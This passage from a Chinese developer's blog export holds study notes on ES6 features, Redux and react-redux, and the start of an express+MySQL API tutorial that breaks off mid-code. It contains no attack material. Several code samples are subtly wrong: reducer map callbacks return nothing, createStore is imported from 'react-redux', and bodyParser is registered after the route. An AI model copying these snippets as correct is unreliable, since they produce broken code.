遍历方法类似Set WeakSetWeakSet 结构与 Set 类似，也是不重复的值的集合。 但是WeakSet 的成员只能是对象，而不能是其他类型的值，并且WeakSet 中的对象都是弱引用，如果其他对象都不再引用该对象，那么垃圾回收机制会自动回收该对象所占用的内存，不考虑该对象还存在于 WeakSet 之中。 WeakSet 不能遍历，是因为成员都是弱引用，随时可能消失，遍历机制无法保证成员的存在，很可能刚刚遍历结束，成员就取不到了。WeakSet 的一个用处，是储存 DOM 节点，而不用担心这些节点从文档移除时，会引发内存泄漏。 WeakMapWeakMap结构与Map结构类似，也是用于生成键值对的集合。 WeakMap只接受对象作为键名（null除外），不接受其他类型的值作为键名，且WeakMap的键名所指向的对象，不计入垃圾回收机制（类似WeakSet）。 WeakMap的专用场合就是，它的键所对应的对象，可能会在将来消失。WeakMap结构有助于防止内存泄漏。 注：WeakMap 弱引用的只是键名，而不是键值，键值依然是正常引用。只要外部的引用消失，WeakMap 内部的引用，就会自动被垃圾回收清除。 123456789let myElement = document.getElementById('logo');let myWeakmap = new WeakMap();myWeakmap.set(myElement, &#123;timesClicked: 0&#125;);myElement.addEventListener('click', function() &#123; let logoData = myWeakmap.get(myElement); logoData.timesClicked++;&#125;, false); 上面代码中，myElement是一个 DOM 节点，每当发生click事件，就更新一下状态。我们将这个状态作为键值放在 WeakMap 里，对应的键名就是myElement。一旦这个 DOM 节点删除，该状态就会自动消失，不存在内存泄漏风险。 Promise123456789const promise = new Promise(function(resolve, reject) &#123; // ... some code if (/* 异步操作成功 */)&#123; resolve(value); &#125; else &#123; reject(error); &#125;&#125;); Promise构造函数接受一个函数作为参数，该函数的两个参数分别是resolve和reject。它们是两个函数，由 JavaScript 引擎提供，不用自己部署。 Promise实例生成以后，可以用then方法分别指定resolved状态和rejected状态的回调函数。 12345promise.then(function(value) &#123; // success&#125;, function(error) &#123; // failure，可选&#125;); then方法返回的是一个新的Promise实例。因此可以采用链式写法，即then方法后面再调用另一个then方法，这样就可以依次调用回调函数 。 12345getJSON(\"/posts.json\").then(function(json) &#123; return json.post;&#125;).then(function(post) &#123; // ...&#125;); 异步操作抛出错误，状态就会变为rejected，就会调用catch方法指定的回调函数，处理这个错误。then方法指定的回调函数在运行中抛出的错误也会被catch方法捕获。 123456getJSON('/posts.json').then(function(posts) &#123; // ...&#125;).catch(function(error) &#123; // 处理 getJSON 和 前一个回调函数运行时发生的错误 console.log('发生错误！', error);&#125;); 如果没有使用catch方法指定错误处理的回调函数，Promise 对象抛出的错误不会传递到外层代码，即不会有任何反应。 Promise.all方法用于将多个 Promise 实例，包装成一个新的 Promise 实例。 1const p = Promise.all([p1, p2, p3]); p的状态由p1、p2、p3决定，分成两种情况： 只有p1、p2、p3的状态都变成fulfilled，p的状态才会变成fulfilled，此时p1、p2、p3的返回值组成一个数组，传递给p的回调函数。 只要p1、p2、p3之中有一个被rejected，p的状态就变成rejected，此时第一个被reject的实例的返回值，会传递给p的回调函数。 Promise.resolve 可以将现有对象转为 Promise 对象。 123Promise.resolve('foo')// 等价于new Promise(resolve =&gt; resolve('foo')) 如果不知道或者不想区分函数f是同步函数还是异步操作，但是想用 Promise 来处理它，即让同步函数同步执行，异步函数异步执行。 12345678const f = () =&gt; console.log('now');(async () =&gt; f())().then(...).catch(...)//或者const f = () =&gt; console.log('now');Promise.try(f); Promise.try就是模拟try代码块，就像promise.catch模拟的是catch代码块。 Iterator遍历器Iterator可以使数据按次序排列，并且主要为for…of循环提供接口。主要包括：Array，String，Map，Set，Object（大部分需要手动部署）。 12345var it = makeIterator(['a', 'b']);it.next() // &#123; value: \"a\", done: false &#125;it.next() // &#123; value: \"b\", done: false &#125;it.next() // &#123; value: undefined, done: true &#125; 默认的 Iterator 接口部署在数据结构的Symbol.iterator属性 ，一个数据结构只要具有Symbol.iterator属性，就可以认为是“可遍历的” 。Symbol.iterator属性本身是一个函数，就是当前数据结构默认的遍历器生成函数。执行这个函数，就会返回一个遍历器。 123456789101112131415const obj = &#123; [Symbol.iterator] : function () &#123; return &#123; next: function () &#123; return &#123; value: 1, done: true &#125;; &#125; &#125;; &#125;&#125;;let it = obj[Symbol.iterator]()it.next() //&#123;value: 1, done: true&#125; 12345678910111213141516171819let obj = &#123; data: [ 'hello', 'world' ], [Symbol.iterator]() &#123; const self = this; let index = 0; return &#123; next() &#123; if (index &lt; self.data.length) &#123; return &#123; value: self.data[index++], done: false &#125;; &#125; else &#123; return &#123; value: undefined, done: true &#125;; &#125; &#125; &#125;; &#125;&#125;; 让for…of可以遍历对象的办法： 123456789101112131415161718//方法一for (var key of Object.keys(someObject)) &#123; console.log(key + ': ' + someObject[key]);&#125;//方法二：使用Generator包装function* entries(obj) &#123; for (let key of Object.keys(obj)) &#123; yield [key, obj[key]]; &#125;&#125;for (let [key, value] of entries(obj)) &#123; console.log(key, '-&gt;', value);&#125;// a -&gt; 1// b -&gt; 2// c -&gt; 3 GeneratorGenerator 函数是一个状态机，封装了多个内部状态，并返回一个遍历器对象，可以依次遍历 Generator 函数内部的每一个状态。 yield表达式只能用在 Generator 函数里面，用在其他地方都会报错。 123456789101112131415161718var arr = [1, [[2, 3], 4], [5, 6]];var flat = function* (a) &#123; var length = a.length; for (var i = 0; i &lt; length; i++) &#123; var item = a[i]; if (typeof item !== 'number') &#123; yield* flat(item); &#125; else &#123; yield item; &#125; &#125;&#125;;for (var f of flat(arr)) &#123; console.log(f);&#125;// 1, 2, 3, 4, 5, 6 与Iterator接口的关系： 12345678var myIterable = &#123;&#125;;myIterable[Symbol.iterator] = function* () &#123; yield 1; yield 2; yield 3;&#125;;[...myIterable] // [1, 2, 3] 利用 Generator 函数，可以在任意对象上部署 Iterator 接口。 12345678910111213141516function* iterEntries(obj) &#123; let keys = Object.keys(obj); for (let i=0; i &lt; keys.length; i++) &#123; let key = keys[i]; yield [key, obj[key]]; &#125;&#125;let myObj = &#123; foo: 3, bar: 7 &#125;;for (let [key, value] of iterEntries(myObj)) &#123; console.log(key, value);&#125;// foo 3// bar 7 Generator 函数和for...of循环，实现斐波那契数列的例子： 123456789101112function* fibonacci() &#123; let [prev, curr] = [0, 1]; for (;;) &#123; yield curr; [prev, curr] = [curr, prev + curr]; &#125;&#125;for (let n of fibonacci()) &#123; if (n &gt; 1000) break; console.log(n);&#125; yield*表达式用来在一个 Generator 函数里面执行另一个 Generator 函数。 12345function* bar() &#123; yield 'x'; yield* foo(); yield 'y';&#125; async基本用法async 是 Generator 函数的语法糖。 async函数将 Generator 函数的星号（*）替换成async，将yield替换成await。 async函数自带执行器 ；其返回值是 Promise 对象。 123456789101112131415161718192021222324252627// 函数声明async function foo() &#123;&#125;// 函数表达式const foo = async function () &#123;&#125;;// 对象的方法let obj = &#123; async foo() &#123;&#125; &#125;;obj.foo().then(...)// Class 的方法class Storage &#123; constructor() &#123; this.cachePromise = caches.open('avatars'); &#125; async getAvatar(name) &#123; const cache = await this.cachePromise; return cache.match(`/avatars/$&#123;name&#125;.jpg`); &#125;&#125;const storage = new Storage();storage.getAvatar('jake').then(…);// 箭头函数const foo = async () =&gt; &#123;&#125;; 注意点： await命令后面的Promise对象，运行结果可能是rejected，所以最好把await命令放在try...catch代码块中。 123456789101112131415async function myFunction() &#123; try &#123; await somethingThatReturnsAPromise(); &#125; catch (err) &#123; console.log(err); &#125;&#125;// 另一种写法async function myFunction() &#123; await somethingThatReturnsAPromise() .catch(function (err) &#123; console.log(err); &#125;);&#125; 多个await命令后面的异步操作，如果不存在继发关系，最好让它们同时触发。 12345678// 写法一let [foo, bar] = await Promise.all([getFoo(), getBar()]);// 写法二let fooPromise = getFoo();let barPromise = getBar();let foo = await fooPromise;let bar = await barPromise; await命令只能用在async函数之中，如果用在普通函数，就会报错。 async 函数可以保留运行堆栈。 实现原理将 Generator 函数和自动执行器，包装在一个函数里。 1234567891011async function fn(args) &#123; // ...&#125;// 等同于function fn(args) &#123; return spawn(function* () &#123; //spawn函数是自动执行器 // ... &#125;);&#125; spawn函数的实现： 12345678910111213141516171819202122function spawn(genF) &#123; //传入generator函数 return new Promise(function(resolve, reject) &#123; const gen = genF(); function step(nextF) &#123; let next; try &#123; next = nextF(); &#125; catch(e) &#123; return reject(e); &#125; if(next.done) &#123; return resolve(next.value); &#125; Promise.resolve(next.value).then(function(v) &#123; step(function() &#123; return gen.next(v); &#125;); &#125;, function(e) &#123; step(function() &#123; return gen.throw(e); &#125;); &#125;); &#125; step(function() &#123; return gen.next(undefined); &#125;); &#125;);&#125; 与其他异步方法的比较假定某个 DOM 元素上面，部署了一系列的动画，前一个动画结束，才能开始后一个。如果当中有一个动画出错，就不再往下执行，返回上一个成功执行的动画的返回值。 Promise： 123456789101112131415161718192021222324function chainAnimationsPromise(elem, animations) &#123; // 变量ret用来保存上一个动画的返回值 let ret = null; // 新建一个空的Promise let p = Promise.resolve(); // 使用then方法，添加所有动画 for(let anim of animations) &#123; p = p.then(function(val) &#123; ret = val; return anim(elem); &#125;); &#125; // 返回一个部署了错误捕捉机制的Promise return p.catch(function(e) &#123; /* 忽略错误，继续执行 */ &#125;).then(function() &#123; return ret; &#125;);&#125; Generator： 123456789101112131415function chainAnimationsGenerator(elem, animations) &#123; return spawn(function*() &#123; let ret = null; try &#123; for(let anim of animations) &#123; ret = yield anim(elem); &#125; &#125; catch(e) &#123; /* 忽略错误，继续执行 */ &#125; return ret; &#125;);&#125; async： 1234567891011async function chainAnimationsAsync(elem, animations) &#123; let ret = null; try &#123; for(let anim of animations) &#123; ret = await anim(elem); &#125; &#125; catch(e) &#123; /* 忽略错误，继续执行 */ &#125; return ret;&#125; Async 函数的实现最简洁，最符合语义，容易理解，几乎没有语义不相关的代码，并且不需要自己提供自动执行器。 按顺序完成异步操作123456789101112131415161718192021//继发async function logInOrder(urls) &#123; for (const url of urls) &#123; const response = await fetch(url); console.log(await response.text()); &#125;&#125;//并发async function logInOrder(urls) &#123; // 并发读取远程URL const textPromises = urls.map(async url =&gt; &#123; const response = await fetch(url); return response.text(); &#125;); // 按次序输出 for (const textPromise of textPromises) &#123; console.log(await textPromise); &#125;&#125; 虽然map方法的参数是async函数，但它是并发执行的，因为只有async函数内部是继发执行，外部不受影响。","categories":[],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://yoursite.com/tags/Javascript/"},{"name":"ES6","slug":"ES6","permalink":"http://yoursite.com/tags/ES6/"}]},{"title":"Redux学习笔记","slug":"Redux学习笔记","date":"2019-07-25T07:10:35.000Z","updated":"2019-08-10T06:15:02.080Z","comments":true,"path":"2019/07/25/Redux学习笔记/","link":"","permalink":"http://yoursite.com/2019/07/25/Redux学习笔记/","excerpt":"","text":"介绍前述Redux：JavaScript 状态容器，可预测的状态管理机 。Redux的思想继承自Facebook的Flux架构，但比Flux更加简洁易用。 安装稳定版： 1npm install --save redux 多数情况下，还需要使用React 绑定库和开发者工具 12npm install --save react-reduxnpm install --save-dev redux-devtools 主要组成Redux应用的主要组成为：action、reducer、store。 action：是Redux中信息的载体， store 的唯一信息来源。一般通过 store.dispatch() 将 action 传到 store。 reducer：根据action做出相应响应，决定如何修改应用的状态state。需要在编写reducer前设计好state，state包含服务器获取的数据和UI状态。 reducer是一个纯函数，它接受两个参数，当前的state和action，返回新的state。 (previousState, action) =&gt; newState store：是Redux的一个对象，也是action和reducer之间的桥梁。主要负责： 保存应用状态 通过方法getState()访问应用状态 通过方法dispatch(action)发送更新状态的意图 通过方法subscribe(listener)注册监听函数、监听应用状态的改变 一个Redux应用只有一个store，store保存了唯一数据源。store通过createStore()创建，创建时需要传递reducer作为参数。 主要组成部分之间关系的简单示例当使用普通对象来描述应用的 state 时。例如，todo 应用的 state 可能长这样： 12345678910&#123; todos: [&#123; text: 'Eat food', completed: true &#125;, &#123; text: 'Exercise', completed: false &#125;], visibilityFilter: 'SHOW_COMPLETED'&#125; 要想更新 state 中的数据，需要发起一个 action。Action 就是一个普通 JavaScript 对象，用来描述发生了什么。下面是一些 action 的示例： 123&#123; type: 'ADD_TODO', text: 'Go to swimming pool' &#125;&#123; type: 'TOGGLE_TODO', index: 1 &#125;&#123; type: 'SET_VISIBILITY_FILTER', filter: 'SHOW_ALL' &#125; 强制使用 action 来描述所有变化带来的好处是可以清晰地知道应用中到底发生了什么。如果一些东西改变了，就可以知道为什么变。action 就像是描述发生了什么的指示器。最终，为了把 action 和 state 串起来，我们需要开发一些函数，也就是 reducer。reducer 是接收 state 和 action作为参数并返回新的 state 的函数。 对于较大的应用来说，不可能仅仅写一个这样的函数，所以我们需要编写很多小函数来分别管理 state 的一部分： 12345678910111213141516171819202122function todos(state = [], action) &#123; switch (action.type) &#123; case 'ADD_TODO': return state.concat([&#123; text: action.text, completed: false &#125;]) case 'TOGGLE_TODO': return state.map((todo, index) =&gt; action.index === index ? &#123; text: todo.text, completed: !todo.completed &#125; : todo ) default: return state &#125;&#125;function visibilityFilter(state = 'SHOW_ALL', action) &#123; if (action.type === 'SET_VISIBILITY_FILTER') &#123; return action.filter &#125; else &#123; return state &#125;&#125; 可以再构建一个 reducer 调用上面两个 reducer 以管理整个应用的 state： 123456function todoApp(state = &#123;&#125;, action) &#123; return &#123; todos: todos(state.todos, action), visibilityFilter: visibilityFilter(state.visibilityFilter, action) &#125;&#125; 三大原则单一数据源整个应用的 state 被储存在一棵 object tree 中，并且这个 object tree 只存在于唯一一个 store 中。 这让同构应用开发变得非常容易。来自服务端的 state 可以在无需编写更多代码的情况下被序列化并注入到客户端中。由于是单一的 state tree ，调试也变得非常容易。在开发中，可以把应用的 state 保存在本地以加快开发速度。此外，受益于单一的 state tree ，以前难以实现的如“撤销/重做”这类功能也变得轻而易举。 State 只读唯一改变 state 的方法就是触发 action，action 是一个用于描述已发生事件的普通对象。 这样确保了视图和网络请求都不能直接修改 state，它们只能表达想要修改的意图。因为所有的修改都被集中化处理，且严格按照顺序执行，因此不用担心竞态条件（race condition）的出现。 Action 就是普通对象而已，它们可以被日志打印、序列化、储存、或在测试时回放出来。 使用纯函数执行修改为了描述 action 如何改变 state tree ，我们需要编写 reducers。 Reducer 只是一些纯函数，它接收先前的 state 和 action，并返回新的 state。刚开始可以只有一个 reducer，随着应用变大，你可以把它拆成多个小的 reducers，分别独立地操作 state tree 的不同部分。因为 reducer 只是函数，我们可以控制它们被调用的顺序，传入附加数据，编写可复用的 reducer 来处理一些通用任务，如分页器。 Actionaction用于描述应用发生了什么操作。 构建Action 本质上是 JavaScript 普通对象。我们约定，action 内必须使用一个字符串类型的 type字段来表示将要执行的动作。多数情况下，type 会被定义成字符串常量。 除了 type 字段外，action 对象的结构由实际业务场景决定（可参照 Flux 标准 Action 获取关于如何构造 action 的建议）。 我们还需要再添加一个 action index 来表示用户完成任务的动作序列号。因为数据是存放在数组中的，所以我们通过下标 index 来引用特定的任务。而实际项目中一般会在新建数据的时候生成唯一的 ID 作为数据的引用标识。 通过action creator创建action，如下所示是以todos应用为示例的actions.js： 12345678910111213141516171819202122/*actions.js*/export const ADD_TODO = 'ADD_TODO'export const TOGGLE_TODO = 'TOGGLE_TODO'export const SET_VISIBILITY_FILTER = 'SET_VISIBILITY_FILTER'//筛选todo列表的filtersexport const VisibilityFilters = &#123; SHOW_ALL: 'SHOW_ALL', SHOW_COMPLETED: 'SHOW_COMPLETED', SHOW_ACTIVE: 'SHOW_ACTIVE'&#125;//action creatorsexport function addTodo (text) &#123; return &#123; type: ADD_TODO, text &#125;&#125;export function toggleTodo (index) &#123; return &#123; type: TOGGLE_TODO, index &#125;&#125;export function setVisibilityFilter (filter) &#123; return &#123; type: SET_VISIBILITY_FILTER, filter &#125;&#125; 简化可以看到action creators的这些function都很相似，我们可以构造一个用于生成 action creator 的函数来简化样板代码。 12345678910111213141516171819function makeActionCreator(type, ...argNames) &#123; return function(...args) &#123; const action = &#123; type &#125; argNames.forEach((arg, index) =&gt; &#123; action[argNames[index]] = args[index] &#125;) return action &#125;&#125;//定义常量const ADD_TODO = 'ADD_TODO'const EDIT_TODO = 'EDIT_TODO'const REMOVE_TODO = 'REMOVE_TODO'//使用makeActionCreatorexport const addTodo = makeActionCreator(ADD_TODO, 'text')export const editTodo = makeActionCreator(EDIT_TODO, 'id', 'text')export const removeTodo = makeActionCreator(REMOVE_TODO, 'id') Reducerreducer根据action做出响应，决定如何修改应用的状态state。 构建首先设计state，以todos应用为例： 12345678910&#123; todos: [&#123; text: 'Learn React', completed: true &#125;, &#123; text: 'Learn Redux', completed: false &#125;], visibilityFilter: 'SHOW_COMPLETED'&#125; 然后尝试创建一个最基本的reducer： 1234567891011121314151617181920212223242526272829303132333435import &#123; VisibilityFilters &#125; from './actions'const initialState = &#123; todos: [], visibilityFilter: VisibilityFilters.SHOW_ALL&#125;//reducerfunction todoApp(state = initialState, action) &#123; switch (action.type) &#123; case SET_VISIBILITY_FILTER: return &#123; ...state, visibilityFilter: action.filter &#125; case ADD_TODO: return &#123; ...state, todos: [ ...state.todos, &#123; text: action.text, completed: false &#125; ] &#125; case TOGGLE_TODO: return &#123; ...state, todos: state.todos.map( (todo, index) =&gt; &#123; if(index === action.index) &#123; return &#123; ...todo, completed: !todo.completed &#125; &#125; &#125;) &#125; default: return state &#125;&#125; 注：除了利用扩展运算符(…)创建新的state对象，还可以使用ES6的Object.assign() Object.assign() 方法用于将所有可枚举属性的值从一个或多个源对象复制到目标对象并返回目标对象。 语法：Object.assign(target, …sources); 1234567891011function todoApp(state = initialState, action) &#123; switch (action.type) &#123; case SET_VISIBILITY_FILTER: return Object.assign(&#123;&#125;, state, &#123; visibilityFilter: action.filter &#125;) //...其他的case也类似 default: return state &#125;&#125; 上面我们使用todoApp一个reducer处理所有的action，当应用变得复杂时，todoApp也会变得更加复杂，这时需要拆分出多个reducer，每个reducer处理state中的部分状态。 1234567891011121314151617181920212223242526272829303132333435//处理todo的reducerfunction todos (state = [], action) &#123; switch (action.type) &#123; case 'ADD_TODO': return state.concat([&#123; text: action.text, completed: false &#125;]) case 'TOGGLE_TODO': return state.map( (todo, index) =&gt; &#123; action.index === index ? &#123; ...todo, completed: !todo.completed &#125; : todo &#125; ) default: return state &#125;&#125;//处理visibilityFilter的reducerfunction visibilityFilter (state = 'SHOW_ALL', action) &#123; switch (action.type) &#123; case SET_VISIBILITY_FILTER: return action.filter default: return state &#125;&#125;//简化后的todoAppfunction todoApp (state = &#123;&#125;, action) &#123; return &#123; todos: todos(state.todos, action), visibilityFilter: visibilityFilter(state.visibilityFilter, action) &#125;&#125; Redux提供了一个combineReducers()函数，用于合并多个reducer。可以使用combineReducers()对todoApp进行进一步改写： 123456import &#123; combineReducers &#125; from 'redux'const todoApp = combineReducers(&#123; todos, visibilityFilter&#125;) 简化与action creater部分的简化方式类似，我们可以创建一个Reducers生成器，将action types映射到对应的handlers，取代之前用的switch： 1234567891011121314151617function createReducer (initialState, handlers) &#123; return function reducer(state = initialState, action) &#123; if (handlers.hasOwnProperty(action.type)) &#123; return handlers[action.type](state, action) &#125; else &#123; return state &#125; &#125;&#125;//使用createReducerexport const todos = createReducer([], &#123; [ActionTypes.ADD_TODO]: (state, action) =&gt; &#123; //这里传入的state是state.todos const text = action.text.trim() return [...state, &#123; text: text, completed: false &#125;] &#125;&#125;) 注意点！永远不要在 reducer 里做这些操作： 修改传入参数； 执行有副作用的操作，如 API 请求和路由跳转； 调用非纯函数，如 Date.now() 或 Math.random()。 reducer 一定要保持纯净。只要传入参数相同，返回计算得到的下一个 state 就一定相同。没有特殊情况，没有副作用，没有 API 请求，没有变量修改，单纯执行计算。 StoreStore 是把action和reducer联系到一起的桥梁。Store 有以下职责： 维持应用的 state； 提供 getState() 方法获取 state； 提供 dispatch(action)方法更新 state； 通过 subscribe(listener)注册监听器； 通过 subscribe(listener)返回的函数注销监听器。 再次注意 Redux 应用只有一个store。当需要拆分数据处理逻辑时，应该使用 reducer 组合而不是创建多个 store。 构建123456import &#123; createStore &#125; from 'redux'import todoApp from './reducers'let store = createStore(todoApp)//注：createStore的第二个参数是可选的，用于设置state的初始状态let store = createStore(todoApp, initialState) 发起Actions123456789101112131415161718192021222324import &#123; addTodo, toggleTodo, setVisibilityFilter, VisibilityFilters&#125; from './actions'//打印初始状态console.log(store.getState())//每次 state 更新时，打印日志//subscribe() 返回一个函数用来注销监听器const unsubscribe = store.subscribe(() =&gt; console.log(store.getState()))//发起actionsstore.dispatch(addTodo('learn actions'))store.dispatch(addTodo('learn reducers'))store.dispatch(addTodo('learn store'))store.dispatch(toggleTodo(0))store.dispatch(toggleTodo(1))store.dispatch(setVisibilityFilter(VisibilityFilters.SHOW_COMPLETED))//停止监听 state 更新unsubscribe() 数据流严格的单向数据流是 Redux 架构的设计核心。 这意味着应用中所有的数据都遵循相同的生命周期，这样可以让应用变得更加可预测且容易理解。同时也鼓励做数据范式化，这样可以避免使用多个且独立的无法相互引用的重复数据。 Redux 应用中数据的生命周期遵循下面 4 个步骤： 调用 store.dispatch(action)。 store 调用传入的 reducer 函数。 根 reducer 把多个子 reducer 的输出合并成单一的 state 树。 store 保存根 reducer 返回的完整 state 树。 新的树就是应用的下一个 state，所有订阅 store.subscribe(listener)的监听器都将被调用；监听器里可以调用 store.getState() 获得当前 state，可以应用新的 state 来更新 UI。 在React中使用Redux展示组件与容器组件 展示组件 容器组件 作用 描述如何展现（骨架、样式） 描述如何运行（数据获取、状态更新） 直接使用 Redux 否 是 数据来源 props 监听 Redux state 数据修改 从 props 调用回调函数 向 Redux 派发 actions 调用方式 手动 通常由 React Redux 生成 展示组件展示组件只定义外观而不考虑数据来源和如何改变。如果把代码从 Redux 迁移到别的架构，这些组件可以不做任何改动直接使用，它们并不依赖于 Redux。 容器组件容器组件用于把展示组件连接到 Redux 。例如，展示型的 TodoList 组件需要一个类似 VisibleTodoList 的容器来监听 Redux store 变化并处理如何过滤出要显示的数据，VisibleTodoList根据当前显示的状态来对 todo 列表进行过滤，并渲染 TodoList。 connectreact-redux提供了一个connect函数，用于把React组件和Redux store连接起来，生成一个容器组件，负责数据管理和业务逻辑。 1234import &#123; connect &#125; from 'react-redux'import TodoList from './TodoList'const VisibleTodoList = connect()(TodoList); 在这里VisibleTodoList需要承担两个工作： 从 Redux store 中获取展示组件所需的应用状态 把展示组件的状态变化同步到 store 中 通过为connect传递两个函数作为参数可以让VisibleTodoList具备这两个功能： 1234567import &#123; connect &#125; from 'react-redux'import TodoList from './TodoList'const VisibleTodoList = connect( mapStateToProps, mapDispatchToProps)(TodoList); mapStateToProps第一个函数的作用是把state转换成props，state是store中保存的应用状态，它会作为参数传递给mapStateToProps，props就是被连接的展示组件的props。 以筛选Todos列表为例： 1// 每当store中的state更新时mapStateToProps就会重新执行传给组件新的props。 mapStateToProps除了接收state参数外还可以传入第二个参数作为容器组件的props对象。 mapDispatchToProps第二个函数的作用是发送action更新state，函数接收store.dispatch作为参数并返回展示组件用来修改state的函数。 1234567891011function toggleTodo(id) &#123; return &#123; type: 'TOGGLE_TODO', id &#125;&#125;function mapDispatchToProps(dispatch) &#123; return &#123; onTodoClick: function(id) &#123; dispatch(toggleTodo(id)) &#125; &#125;&#125; 这样展示组件就可以调用this.props.onTodoClick(id)发送修改待办事项状态的action了。与mapStateToProps相同，mapDispatchToProps也支持第二个参数代表容器组件的props。 Provider组件通过connect创建出的容器组件通过Provider组件获取Redux store。Provider需要接收一个store属性，并把store属性保存到context，Provider通过context把store传递给子组件。 所以一般把Provider组件作为根组件，使内层的任意组件可以从context中获取store对象。 12345678910111213import &#123; render &#125; from &apos;react-dom&apos;import &#123; createStore &#125; from &apos;react-redux&apos;import todoApp from &apos;./reducers&apos;import App from &apos;./components/App&apos;let store = createStore(todoApp)render( &lt;Provider store=&#123;store&#125;&gt; &lt;App /&gt; &lt;/Provider&gt;, document.getElementById(&apos;root&apos;)); 中间件Redux middleware 提供的是位于 action 被发起之后，到达 reducer 之前的扩展点。 可以利用 Redux middleware 来进行日志记录、创建错误报告、调用异步接口或者路由等等。 现在模拟日志记录和打印错误信息的中间件：（抽象并整合后的形式） 123456789101112131415161718192021const logger = store =&gt; next =&gt; action =&gt; &#123; console.log('dispatching', action) let result = next(action) console.log('next state', store.getState()) return result&#125;const errReporter = store =&gt; next =&gt; action =&gt; &#123; try &#123; return next(action) &#125; catch (err) &#123; console.error('Caught an exception!', err) Raven.captureException(err, &#123; extra: &#123; action, state: store.getState() &#125; &#125;) throw err &#125;&#125; 引用方式： 12345678import &#123; createStore, combineReducers, applyMiddleware &#125; from 'redux'const todoApp = combineReducers(reducers)const store = createStore( todoApp, // applyMiddleware() 告诉 createStore() 如何处理中间件 applyMiddleware(logger, errReporter)) 现在任何被发送到 store 的 action 都会经过 logger 和 errReporter： 12// 将经过 logger 和 errReporter 两个中间件store.dispatch(addTodo('Use Middlewares')) applyMiddleware()的实现： 1234567891011121314151617181920export default function applyMiddleware (...middlewares) &#123; return (createStore) =&gt; (...args) =&gt; &#123; const store = createStore(...args) let dispatch = store.dispatch let chain = [] const middlewareAPI = &#123; getState: store.getState, dispatch: (...args) =&gt; dispatch(...args) &#125; chain = middlewares.map(middleware =&gt; middleware(middlewareAPI)) dispatch = compose(...chain)(store.dispatch) return &#123; ...store, dispatch &#125; &#125;&#125; compose(f,g,h)等价于(…args) =&gt; f(g(h(args))) 异步Redux中处理异步操作需要借助中间件的帮助，redux-thunk是处理异步操作最常用的中间件。可以使用 applyMiddleware() 来增强 createStore()。 12345678import &#123; createStore, applyMiddleware &#125; from 'redux'import thunk from 'redux-thunk'import reducer from './reducers'const store = createStore( reducer, applyMiddleware(thunk)); 处理一个网络请求会使用三个action，分别表示请求开始、请求成功和请求失败。 123&#123; type: 'FETCH_DATA_REQUEST' &#125;&#123; type: 'FETCH_DATA_SUCCESS', data: &#123;...&#125; &#125;&#123; type: 'FETCH_DATA_FAILURE', error: 'something wrong...' &#125; 定义一个异步action模拟向服务器请求数据： 123456789101112131415161718function getData (url) &#123; return function (dispatch) &#123; dispatch(&#123; type: 'FETCH_DATA_REQUEST' &#125;) return fetch (url) .then( res =&gt; res.json(), err =&gt; &#123; console.log(err) dispatch(&#123; type: 'FETCH_DATA_FAILURE', error: 'something wrong...' &#125;) &#125; ) .then(json =&gt; dispatch(&#123;type: 'FETCH_DATA_SUCCESS', data: json&#125;) ) &#125;&#125;store.dispatch(getData(url)); 异步数据流的处理： 像 redux-thunk 或 redux-promise 这样支持异步的 middleware 都包装了 store 的 dispatch()方法，可以 dispatch 一些除了 action 以外的其他内容，例如：函数或者 Promise。使用的任何 middleware 都可以通过自己的方式解析 dispatch 的内容并继续传递 actions 给下一个 middleware。 middleware 链中的最后一个中间件 dispatch 的 action 必须是一个普通对象。我们可以使用任意多异步的 middleware 去做想做的事情，但是需要使用普通对象作为最后一个被 dispatch 的 action ，来将处理流程带回同步方式。 参考及学习资料 《React进阶之路》—— 徐超 《深入React技术栈》—— 陈屹 https://github.com/brickspert/blog/issues/22 通俗易懂的好文 http://cn.redux.js.org Redux中文文档","categories":[],"tags":[{"name":"Redux","slug":"Redux","permalink":"http://yoursite.com/tags/Redux/"}]},{"title":"使用express+MySQL实现数据接口并部署","slug":"使用express-MySQL实现数据接口并部署","date":"2019-07-08T14:20:58.000Z","updated":"2019-08-03T05:21:01.140Z","comments":true,"path":"2019/07/08/使用express-MySQL实现数据接口并部署/","link":"","permalink":"http://yoursite.com/2019/07/08/使用express-MySQL实现数据接口并部署/","excerpt":"","text":"创建123npm initnpm install express --savenpm install ejs 创建main.js（init的时候选的文件名）和api、config、routers、src、views文件夹 项目结构 12345678910111213|── main.js //入口文件|── src //静态资源目录│ ├── css│ ├── js│ └── images|── api //接口目录│ └── addUser.js //接口文件|—— config //配置文件目录| └── config.json|—— routers //路由文件目录| └── index.js|—— views //模板文件目录| └── index.ejs 实现main.js 1234567891011121314151617181920212223242526272829const express = require('express');const app = express();/*文件路径处理*/const path = require('path');/*页面模板view处理*/app.set('views', path.join(__dirname, 'views'));app.set('view engine', 'ejs');/*页面静态文件处理*/app.use(express.static('src'));/*页面路由处理*/const index = require('./routers/index');app.use('/', index);/*接口路由处理*/const addUser = require('./api/addUser');app.use('/addUser', addUser);/*接口数据body解析处理*/const bodyParser = require('body-parser');app.use(bodyParser.json());app.use(bodyParser.urlencoded(&#123; extended : false &#125;));const server = app.listen(9000, function () &#123; console.log('success!');&#125;) routers&gt;index.js 123456789const express = require('express');const router = express.Router();/*设置首页路由get请求*/router.get('/', function(req, res, next)&#123; res.render('index', &#123;title: 'Try express'&#125;);&#125;)module.exports = router; views&gt;index.ejs 12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;%= title %&gt;&lt;/title&gt; &lt;link rel='stylesheet' type=\"text/css\" href=\"/css/style.css\"&gt; &lt;script src=\"/js/jquery-3.1.1.min.js\"&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;input id='name' name='name' type=\"text\"/ placeholder=\"输入用户名\"&gt; &lt;input id='btn' type=\"button\" value=\"提交\"/&gt; &lt;script&gt; $('#btn').on('click', function()&#123; let name = $('#name').val(); console.log(name); $.post('/addUser', &#123;name: name&#125;, function(data)&#123; console.log(data); alert('添加成功！'); &#125;); &#125;) &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; config&gt;config.json配置mysql信息 1234567&#123; \"host\": \"ip\", \"port\": \"端口号\", \"user\": \"用户名\", \"password\": \"密码\", \"database\": \"数据库名称\"&#125; api&gt;addUser.js 123456789101112131415161718192021222324252627282930313233const express = require('express');const router = express.Router();const mysql = require('mysql');const config = require('../config/config.json');router.post('/', function(req, res)&#123; /*连接数据库*/ const connection = mysql.createConnection(config); connection.connect(); /*获取传进来的参数*/ var name = req.body.name || ''; 